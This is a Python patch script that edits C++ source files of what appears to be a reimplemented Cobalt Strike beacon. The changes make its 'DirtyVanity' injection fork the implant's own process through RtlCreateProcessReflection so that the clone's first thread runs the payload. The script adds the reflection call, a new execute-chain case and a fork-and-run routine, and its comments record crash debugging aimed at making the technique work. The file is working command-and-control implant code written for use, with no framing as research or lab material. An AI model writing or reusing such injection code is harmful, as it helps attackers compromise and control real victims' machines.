#!/usr/bin/env python3
"""Rewrite DirtyVanity: raw RtlCloneUserProcess -> RtlCreateProcessReflection.

The raw clone leaves the fork without the loader bootstrap state the
reflection API sets up: any thread we create inside it AVs in ntdll!memset
(live: ntdll+0xa4778, movaps) and calling the raw API from managed hosts
deadlocks outright (ctypes/csc experiments). The official DirtyVanity
contract is RtlCreateProcessReflection(target, flags, StartAddress, ...) -
the clone's INITIAL thread begins at the payload entry. New shape: the
spawn site runs the normal inject pipeline against OUR OWN process (local
mirror + transforms), and the DirtyVanity opcode in the execute chain
triggers the reflection fork.
"""
import io

# 1) inject.h: prototype + comment update
p = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\inject.h"
s = io.open(p, encoding="utf-8").read()
old = '#define PI_EXEC_DIRTYVANITY          0xA  /* fork&run via RtlCloneUserProcess (spawn sites) */'
assert s.count(old) == 1
s = s.replace(old, '#define PI_EXEC_DIRTYVANITY          0xA  /* fork&run via RtlCreateProcessReflection */')
old2 = "BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter);"
assert s.count(old2) == 1
s = s.replace(old2, old2 + "\nBOOL inject_via_dirtyvanity_reflect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter);")
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("inject.h updated")

# 2) inject.cpp: execute-chain case
p2 = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\inject.cpp"
s2 = io.open(p2, encoding="utf-8").read()
old3 = """			/* try NtQueueApcThread against a suspended process */
			case PI_EXEC_NTQUEUEAPCTHREAD_S:"""
assert s2.count(old3) == 1
s2 = s2.replace(old3, """			/* 4.12 DirtyVanity fork&run trigger: reflect our own process;
			 * the clone inherits this mirrored payload and its initial
			 * thread starts at the entry (see inject_tier2.cpp) */
			case PI_EXEC_DIRTYVANITY:
				if (inject_via_dirtyvanity_reflect(context, (char *)ptr + offset, parameter))
					return TRUE;
				break;

			/* try NtQueueApcThread against a suspended process */
			case PI_EXEC_NTQUEUEAPCTHREAD_S:""")
io.open(p2, "w", encoding="utf-8", newline="").write(s2)
print("inject.cpp chain case added")

# 3) inject_tier2.cpp: replace the forkrun implementation
p3 = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\inject_tier2.cpp"
s3 = io.open(p3, encoding="utf-8").read()
old4 = s3[s3.find("/* 4.12 DirtyVanity fork&run: clone our own host process"):]
assert len(old4) > 100
new4 = """/* 4.12 DirtyVanity fork&run via RtlCreateProcessReflection. The original
 * implementation called the raw ntdll!RtlCloneUserProcess primitive and
 * then ran the normal execute chain inside the clone - but a raw clone
 * lacks the loader bootstrap state a real process start gets, so every
 * thread we minted in it AV'd inside ntdll during init (live: memset
 * movaps at ntdll+0xa4778, deterministic) and calling the raw primitive
 * from a managed host deadlocks outright (reproduced with ctypes/csc
 * probes). The official DirtyVanity contract is the reflection API: it
 * clones the target AND launches the clone's initial thread AT
 * StartAddress, so the payload must simply live in the forked address
 * space before the fork. New shape: inject_dirtyvanity_forkrun points
 * the whole inject pipeline at OUR OWN process (local mirror + profile
 * transforms), and the DirtyVanity opcode in the execute chain triggers
 * the reflection - the clone inherits the mirrored payload and its very
 * first thread runs it. Identical image to us, kernel-recorded start
 * address inside that image: the whole point of the technique. */
typedef struct _T2_RTL_PROCESS_REFLECTION_INFORMATION {
	void * UniqueProcess; /* CLIENT_ID */
	void * UniqueThread;
	void * ReflectionProcessHandle;
	void * ReflectionThreadHandle;
} T2_REFLECTION_INFORMATION;

typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void *, void *, void *, T2_REFLECTION_INFORMATION *);

static BOOL dv_reflect_fired = FALSE;

BOOL inject_via_dirtyvanity_reflect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
	fRtlCreateProcessReflection pReflect;
	T2_REFLECTION_INFORMATION info;
	NTSTATUS st;
	HMODULE nt;

	(void)lpParameter;

	/* the fork clones the context's own process - only meaningful when the
	 * pipeline targets us (the spawn-site contract) */
	if (!context->samePid)
		return FALSE;

	nt = GetModuleHandleA("ntdll.dll");
	if (nt == NULL)
		return FALSE;
	pReflect = (fRtlCreateProcessReflection)GetProcAddress(nt, "RtlCreateProcessReflection");
	if (pReflect == NULL)
		return FALSE;

	ZeroMemory(&info, sizeof(info));
	st = pReflect(GetCurrentProcess(),
	              0x1 | 0x2, /* INHERIT_HANDLES | NO_SYNCHRONIZE (PoC flags) */
	              lpStartAddress, lpParameter, NULL, &info);
	if (st != 0) {
		spawn_log("dv: reflection failed st=", (long)st);
		post_error_d(0x4a, (int)st);
		return FALSE;
	}

	spawn_log("dv: reflection fired, clone pid=", (long)(DWORD_PTR)info.UniqueProcess);
	dv_reflect_fired = TRUE;
	return TRUE;
}

BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, char * parameter, int plen) {
#if !defined _M_X64
	return FALSE;
#else
	/* run the full pipeline against our own process: payload mirror,
	 * profile transforms and the execute chain all apply; the chain's
	 * DirtyVanity opcode (the same one that routed the spawn site here)
	 * performs the fork&run trigger */
	dv_reflect_fired = FALSE;
	inject_process_logic(NULL, GetCurrentProcess(), GetCurrentProcessId(),
	                     dll, dllen, 0, parameter, plen);
	return dv_reflect_fired;
#endif
}
"""
s3 = s3.replace(old4, new4)
io.open(p3, "w", encoding="utf-8", newline="").write(s3)
print("inject_tier2.cpp rewritten")
